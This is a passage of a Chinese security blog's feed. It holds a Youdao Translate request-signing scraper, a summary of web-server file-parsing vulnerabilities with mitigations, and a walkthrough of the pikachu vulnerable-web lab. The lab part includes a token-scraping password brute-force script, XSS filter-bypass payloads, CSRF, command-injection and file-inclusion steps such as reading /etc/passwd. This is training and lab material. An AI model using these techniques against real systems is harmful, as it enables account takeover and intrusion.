class="string">&quot;dict&quot;</span>,</span><br><span class="line">            <span class="string">&quot;client&quot;</span>: <span class="string">&quot;fanyideskweb&quot;</span>,</span><br><span class="line">            <span class="comment"># 时间戳14位</span></span><br><span class="line">            <span class="string">&quot;salt&quot;</span>: salt,</span><br><span class="line">            <span class="comment"># 加密的数据</span></span><br><span class="line">            <span class="string">&quot;sign&quot;</span>: sign,</span><br><span class="line">            <span class="comment"># 时间戳13位</span></span><br><span class="line">            <span class="string">&quot;lts&quot;</span>: lts,</span><br><span class="line">            <span class="string">&quot;bv&quot;</span>: <span class="string">&#x27;d771cbe0c376715add7059261c9e06bd&#x27;</span>,</span><br><span class="line">            <span class="string">&quot;doctype&quot;</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">            <span class="string">&quot;version&quot;</span>: <span class="string">&quot;2.1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;keyfrom&quot;</span>: <span class="string">&quot;fanyi.web&quot;</span>,</span><br><span class="line">            <span class="string">&quot;action&quot;</span>: <span class="string">&quot;FY_BY_REALTlME&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">    url = <span class="string">&#x27;https://fanyi.youdao.com/translate_o?smartresult=dict&amp;smartresult=rule&#x27;</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://fanyi.youdao.com/&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;cookie&#x27;</span>: <span class="string">&#x27;OUTFOX_SEARCH_USER_ID=-1711366876@10.108.160.105; OUTFOX_SEARCH_USER_ID_NCOO=528854206.9578509; &#x27;</span></span><br><span class="line">                  <span class="string">&#x27;fanyi-ad-closed=0; JSESSIONID=aaab35aMiB_2j8wyyH0-x; fanyi-ad-id=305426; &#x27;</span></span><br><span class="line">                  <span class="string">&#x27;___rl__test__cookies=1649078361368 &#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    resp = requests.post(url=url, headers=header, data=data)</span><br><span class="line">    <span class="built_in">print</span>(resp.json()[<span class="string">&#x27;translateResult&#x27;</span>][<span class="number">0</span>][<span class="number">0</span>][<span class="string">&#x27;tgt&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    get_fanyi(<span class="string">&#x27;dog&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;js源码&lt;/p&gt;
&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;s</summary>
      
    
    
    
    <category term="js逆向" scheme="http://example.com/categories/js%E9%80%86%E5%90%91/"/>
    
    
    <category term="爬虫" scheme="http://example.com/tags/%E7%88%AC%E8%99%AB/"/>
    
    <category term="逆向" scheme="http://example.com/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>中间件解析漏洞总结</title>
    <link href="http://example.com/2022/05/01/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2022/05/01/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</id>
    <published>2022-05-01T13:42:26.000Z</published>
    <updated>2022-05-01T13:47:44.491Z</updated>
    
    <content type="html"><![CDATA[<h1 id="服务器解析漏洞"><a href="#服务器解析漏洞" class="headerlink" title="服务器解析漏洞"></a>服务器解析漏洞</h1><pre><code>服务器解析漏洞一般是服务器自身或扩展组件带来的漏洞，配合文件上传等漏洞就会产生很大的危害。我们这里整理常见的服务器apache、IIS、nginx的解析漏洞。</code></pre><h1 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h1><ul><li>一、不可识别解析</li></ul><p>apache解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。<br>比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。<br>apache版本在以下范围内<br>Apache 2.0.x &lt;&#x3D; 2.0.59 Apache 2.2.x &lt;&#x3D; 2.2.17 Apache 2.2.2 &lt;&#x3D; 2.2.8 都可以通过上传xxx.php.rar或xxx.php+任意无法解析后缀解析为php。</p><ul><li>二、配置问题</li></ul><p>1.如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。<br>2.如果在 Apache 的 conf 里有这样一行配置 AddType application&#x2F;x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。</p><ul><li>三、罕见后缀</li></ul><p>Apache配置文件中会有.+.ph(p[345]?|t|tml)此类的正则表达式，被当php程序执行的文件名要符合正则表达式。也就是说php3，php4，php5，pht，phtml等文件后缀也是可以被当作php文件进行解析的。</p><ul><li>四、后缀包含换行符\x0A</li></ul><p>CVE-2017-15715：Apache 2.4.0-2.4.29中，上传一个后缀末尾包含换行符的文件，来绕过FilesMatch。绕过FilesMatch不一定能被PHP解析。</p><h1 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h1><ul><li>一、目录解析</li></ul><p>在IIS-6.0的版本，在.asp或.asa文件夹下的所有类型后缀文件全部解析为.asp文件。<br>存在数据库备份功能的系统并且备份路径可控的话经常会出现这个问题。</p><ul><li>二、文件解析</li></ul><p>在IIS-6.0的版本，服务器默认不解析;后面的内容，所以xxx.asp;.jpg会被解析成xxx.asp。</p><ul><li>三、其他解析类型</li></ul><p>在IIS6.0的版本，如下几种文件类型也会被执行。<br>xxx.asa xxx.cer xxx.cdx</p><ul><li>四、php-cgi漏洞</li></ul><p>在IIS-7.0和IIS-7.5的版本，在php配置文件中，开启cgi.fix_pathinfo，然后上传一个1.jpg的一句话木马文件。然后用菜刀访问1.jpg&#x2F;.php即可连接一句话木马。</p><h1 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h1><ul><li><p>一、低版本nginx<br>空字节代码执行漏洞：nginx 0.5.x、nginx 0.6.x、Nginx 0.7-0.7.65、Nginx 0.8-0.8.37中可以通过在任意文件名后面增加%00.php解析为php，如1.jpg%00.php</p></li><li><p>二、php-cgi漏洞<br>和IIS的第四点相同，在php配置文件中，开启了cgi.fix_pathinfo，导致图片马1.jpg可以通过访问1.jpg&#x2F;.php、1.jpg%00.php解析成php文件</p></li></ul><h1 id="windows解析漏洞"><a href="#windows解析漏洞" class="headerlink" title="windows解析漏洞"></a>windows解析漏洞</h1><p>Windows操作系统中，文件名不能以空格或.开头，也不能以空格或.结尾。<br>当把一个文件命名为以空格或.开头或结尾时，会自动地去掉开头和结尾处的空格和.。利用此特性，也可能造成文件解析漏洞</p><h1 id="应对"><a href="#应对" class="headerlink" title="应对"></a>应对</h1><ol><li>对于php-cgi漏洞，可以修改php.ini文件，将cgi.fix_pathinfo的值设置为0</li><li>使用白名单匹配文件后缀名</li><li>可以对上传后的文件固定后缀，并对之前的所有字符进行重命名<br>作者：Leticia’s Blog ，详情点击阅读<a href="https://uuzdaisuki.com/2018/05/01/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">原文</a>。</li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;服务器解析漏洞&quot;&gt;&lt;a href=&quot;#服务器解析漏洞&quot; class=&quot;headerlink&quot; title=&quot;服务器解析漏洞&quot;&gt;&lt;/a&gt;服务器解析漏洞&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;服务器解析漏洞一般是服务器自身或扩展组件带来的漏洞，配合文件上传等漏洞就会产生很大的危害。
我们这里整理常见的服务器apache、IIS、nginx的解析漏洞。
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&quot;apache&quot;&gt;&lt;a href=&quot;#apache&quot; class=&quot;headerlink&quot; title=&quot;apache&quot;&gt;&lt;/a&gt;apache&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;一、不可识别解析&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;apache解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。&lt;br&gt;比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。&lt;br&gt;apache版本在以下范围内&lt;br&gt;Apache 2.0.x &amp;lt;&amp;#x3D; 2.0.59 Apache 2.2.x &amp;lt;&amp;#x3D; 2.2.17 Apache 2.2.2 &amp;lt;&amp;#x3D; 2.2.8 都可以通过上传xxx.php.rar或xxx.php+任意无法解析后缀解析为php。&lt;/p&gt;</summary>
    
    
    
    <category term="笔记" scheme="http://example.com/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="解析漏洞" scheme="http://example.com/tags/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>pikachu漏洞靶场通关</title>
    <link href="http://example.com/2022/04/28/pikachu%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/"/>
    <id>http://example.com/2022/04/28/pikachu%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/</id>
    <published>2022-04-28T14:17:59.000Z</published>
    <updated>2022-05-29T08:24:20.117Z</updated>
    
    <content type="html"><![CDATA[<h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><h2 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2><p>抓取登录数据包<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205291529117.png"></p><p>发送到intruder模块,设置爆破的参数<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205291531603.png"></p><p>设置payload<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205291532226.png"></p><p>开始爆破,从返回数据包长度判断爆破结果<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205291534944.png"></p><h2 id="绕过验证码-Server"><a href="#绕过验证码-Server" class="headerlink" title="绕过验证码(Server)"></a>绕过验证码(Server)</h2><p>抓包分析,可以看到账号密码,验证码都正确会回显success<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205291537345.png"></p><p>替换一个不存在的账号继续发包<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205291539745.png"></p><p>仅提示账号不存在,说明验证码长期有效,可以爆破,爆破过程和上关一样</p><h2 id="绕过验证码-client"><a href="#绕过验证码-client" class="headerlink" title="绕过验证码(client"></a>绕过验证码(client</h2><p>抓包分析,刚开始输错了几次,发现校验是在前端<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205291543457.png"><br>不用说了,直接爆破</p><h2 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破"></a>token防爆破</h2><p>抓包分析<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205291545789.png"></p><p>随机生成token来校验数据包的唯一性,理论上是无法重复发包的,也就无法进行爆破,但是这里token回显在了前端<br>在分析数据包的时候,可以观察一些特定的变量名,很多key都藏在网页源码里</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205291546774.png"></p><p>自动脚本<br>实现抓取key,并进行爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密码字典</span></span><br><span class="line">pass_dict = [<span class="string">&#x27;123&#x27;</span>, <span class="string">&#x27;456&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>]</span><br><span class="line">session = requests.Session()</span><br><span class="line"><span class="keyword">for</span> pwd <span class="keyword">in</span> pass_dict:</span><br><span class="line">    <span class="comment"># 抓取token</span></span><br><span class="line">    resp = session.get(url=<span class="string">&#x27;http://10.20.146.195:8080/vul/burteforce/bf_token.php&#x27;</span>)</span><br><span class="line">    html = etree.HTML(resp.text)</span><br><span class="line">    token = html.xpath(<span class="string">&#x27;//*[@id=&quot;bf_client&quot;]/input/@value&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># 构造请求参数</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: pwd,</span><br><span class="line">        <span class="string">&#x27;token&#x27;</span>: token,</span><br><span class="line">        <span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;Login&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    resp = session.post(<span class="string">&#x27;http://10.20.146.195:8080/vul/burteforce/bf_token.php&#x27;</span>, data=data)</span><br><span class="line">    <span class="comment"># 判断结果</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;爆破成功&#x27;</span>, pwd)</span><br></pre></td></tr></table></figure><h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><pre><code>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写&quot;CSS&quot;冲突，故又称XSS。一般XSS可以分为如下几种常见类型：    1.反射性XSS;    2.存储型XSS;    3.DOM型XSS;    XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。    XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。    形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。    因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:      输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;      输出转义：根据输出点的位置对输出到前端的内容进行适当转义;</code></pre><h2 id="反射型XSS-GET"><a href="#反射型XSS-GET" class="headerlink" title="反射型XSS(GET)"></a>反射型XSS(GET)</h2><p>对输入长度有限制,直接在url里插入js代码</p><ul><li>payload  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>  <img src="https://raw.githubusercontent.com/chencicici/images/main/202205221450440.png"></li></ul><h2 id="反射型XSS-POST"><a href="#反射型XSS-POST" class="headerlink" title="反射型XSS(POST)"></a>反射型XSS(POST)</h2><p>抓包插入js</p><ul><li>payload  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>  <img src="https://raw.githubusercontent.com/chencicici/images/main/202205221506374.png"></li></ul><h2 id="存储性XSS"><a href="#存储性XSS" class="headerlink" title="存储性XSS"></a>存储性XSS</h2><p>和上关一样,区别就是这个是长久存在的</p><ul><li>payload</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205221510986.png"></p><h2 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM-XSS"></a>DOM-XSS</h2><p>需要先将前面的a标签闭合<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205221516245.png"></p><ul><li>payload  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; onclike=&#x27;</span><span class="title function_">alert</span>(<span class="number">1</span>)<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>  <img src="https://raw.githubusercontent.com/chencicici/images/main/202205221522590.png"></li></ul><h2 id="DOM-XSS-X"><a href="#DOM-XSS-X" class="headerlink" title="DOM-XSS-X"></a>DOM-XSS-X</h2><p>输入框输入的内容会被拼接为url<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205221525149.png"></p><ul><li>payload</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;</span>xss<span class="string">&#x27;)&quot;&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205221532373.png"></p><h2 id="XSS盲打"><a href="#XSS盲打" class="headerlink" title="XSS盲打"></a>XSS盲打</h2><p>无回显,有输入框就插入js<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205221536427.png"></p><p>到后台查看<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205221536452.png"></p><h2 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h2><p>大小写绕过</p><ul><li>payload<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">SCRipt</span>&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/<span class="title class_">SCRIPt</span>&gt;</span><br></pre></td></tr></table></figure></li></ul><h2 id="XSS之htmlspecialchars"><a href="#XSS之htmlspecialchars" class="headerlink" title="XSS之htmlspecialchars"></a>XSS之htmlspecialchars</h2><p>&lt;&gt;被过滤<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205221547770.png"></p><ul><li>payload<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; onclick=&#x27;</span><span class="title function_">alert</span>(<span class="number">1</span>)<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/chencicici/images/main/202205221550582.png"></li></ul><h2 id="XSS之href"><a href="#XSS之href" class="headerlink" title="XSS之href"></a>XSS之href</h2><p>输入会被拼接到href属性里,单引号无法闭合,使用<code>javascript:</code>来执行js代码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205221556988.png"></p><ul><li>payload<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure></li></ul><h2 id="XSS之js输出"><a href="#XSS之js输出" class="headerlink" title="XSS之js输出"></a>XSS之js输出</h2><p>插入js后发现没被闭合,将前面的标签闭合掉<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205221602105.png"></p><ul><li>payload<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="regexp">/script&gt;&lt;script&gt;alert(/</span><span class="number">123</span>/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/chencicici/images/main/202205221604616.png"></li></ul><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><pre><code>CSRF(跨站请求伪造)概述Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为&quot;one click&quot;攻击。 很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆,更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。这里列举一个场景解释一下，希望能够帮助你理解。场景需求：小黑想要修改大白在购物网站tianxiewww.xx.com上填写的会员地址。先看下大白是如何修改自己的密码的：登录---修改会员信息，提交请求---修改成功。所以小黑想要修改大白的信息，他需要拥有：1，登录权限 2，修改个人信息的请求。但是大白又不会把自己xxx网站的账号密码告诉小黑，那小黑怎么办？于是他自己跑到www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：【http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change】于是，他实施了这样一个操作：把这个链接伪装一下，在小白登录xxx网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了,小黑就完成了攻击目的。为啥小黑的操作能够实现呢。有如下几个关键点：1.www.xxx.com这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造;---因此，我们判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造。2.小白点击了小黑发给的链接，并且这个时候小白刚好登录在购物网上;---如果小白安全意识高，不点击不明链接，则攻击不会成功，又或者即使小白点击了链接，但小白此时并没有登录购物网站，也不会成功。---因此，要成功实施一次CSRF攻击，需要“天时，地利，人和”的条件。当然，如果小黑事先在xxx网的首页如果发现了一个XSS漏洞，则小黑可能会这样做： 欺骗小白访问埋伏了XSS脚本（盗取cookie的脚本）的页面，小白中招，小黑拿到小白的cookie，然后小黑顺利登录到小白的后台，小黑自己修改小白的相关信息。---所以跟上面比一下，就可以看出CSRF与XSS的区别：CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。因此，网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：--对敏感信息的操作增加安全的token；--对敏感信息的操作增加安全的验证码；--对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</code></pre><h2 id="CSRF-GET"><a href="#CSRF-GET" class="headerlink" title="CSRF(GET)"></a>CSRF(GET)</h2><p>使用google和edge分别登录两个不同的账号<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205232046252.png"></p><p>使用google浏览器抓包修改数据包,发送给csrf poc<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205232050882.png"></p><p>生成poc<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205232052249.png"></p><p>复制url到edge打开<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205232057945.png"></p><p>可以看到edge登录的账号个人信息已经修改</p><h2 id="CSRF-GET-1"><a href="#CSRF-GET-1" class="headerlink" title="CSRF(GET)"></a>CSRF(GET)</h2><p>同上,只不过换了请求方式</p><h2 id="CSRF-TOKEN"><a href="#CSRF-TOKEN" class="headerlink" title="CSRF(TOKEN)"></a>CSRF(TOKEN)</h2><p>跟前面比较，这里多了一个Token，如果后台对提交的Token进行了验证，由于Token是随机的，我们就无法伪造URL了。</p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><pre><code>RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。远程系统命令执行一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器现在很多的甲方企业都开始实施自动化运维,大量的系统操作会通过&quot;自动化运维平台&quot;进行操作。 在这种平台上往往会出现远程系统命令执行的漏洞,不信的话现在就可以找你们运维部的系统测试一下,会有意想不到的&quot;收获&quot;-_-远程代码执行同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。你可以通过“RCE”对应的测试栏目，来进一步的了解该漏洞。</code></pre><h2 id="exec-“ping”"><a href="#exec-“ping”" class="headerlink" title="exec “ping”"></a>exec “ping”</h2><p>使用<code>|</code>,管道符,将前一个命令执行的结果拿后面一个命令</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205241601018.png"></p><h2 id="exec-eval"><a href="#exec-eval" class="headerlink" title="exec eval"></a>exec eval</h2><p>会执行php代码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205241604192.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205241605900.png"></p><h1 id="FILE-INCLUDE"><a href="#FILE-INCLUDE" class="headerlink" title="FILE INCLUDE"></a>FILE INCLUDE</h1><pre><code>文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中，提供了：include(),include_once()require(),require_once()这些文件包含函数，这些函数在代码设计中被经常使用到。大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：1.本地文件包含漏洞：仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。2.远程文件包含漏洞：能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。</code></pre><h2 id="file-include-local"><a href="#file-include-local" class="headerlink" title="file include(local)"></a>file include(local)</h2><p>读取&#x2F;etc&#x2F;passwd<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205262128057.png"></p><h2 id="file-include-remote"><a href="#file-include-remote" class="headerlink" title="file include(remote)"></a>file include(remote)</h2><p>远程包含一句话<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205262146838.png"></p><h1 id="unsafe-filedownload"><a href="#unsafe-filedownload" class="headerlink" title="unsafe filedownload"></a>unsafe filedownload</h1><p>复制图片下载链接,替换,会下载&#x2F;etc&#x2F;passwd文件<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205271501023.png"></p><h1 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h1><pre><code>如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。 越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对 对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。因此，在在权限管理中应该遵守：1.使用最小权限原则对用户进行赋权;2.使用合理（严格）的权限校验规则;3.使用后台登录态作为条件进行权限判断,别动不动就瞎用前端传进来的条件;你可以通过“Over permission”对应的测试栏目，来进一步的了解该漏洞。</code></pre><h2 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h2><p>先登录lucy账号<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205272040293.png"></p><p>修改url为其他账号<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205272041852.png"></p><p>产生水平越权</p><h2 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h2><p>登录管理员账号,并添加用户<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205272044689.png"></p><p>抓取添加用户的数据包<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205272053361.png"></p><p>登录普通用户,抓取数据包,替换cookie到刚刚抓取的管理员数据包中的cookie<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205272104878.png"></p><p>以普通用户的cookie进行操作<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205272106863.png"></p><p>再次登录管理员账号,查看<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205272107993.png"></p><p>添加用户成功</p><h1 id="sql注入"><a href="#sql注入" class="headerlink" 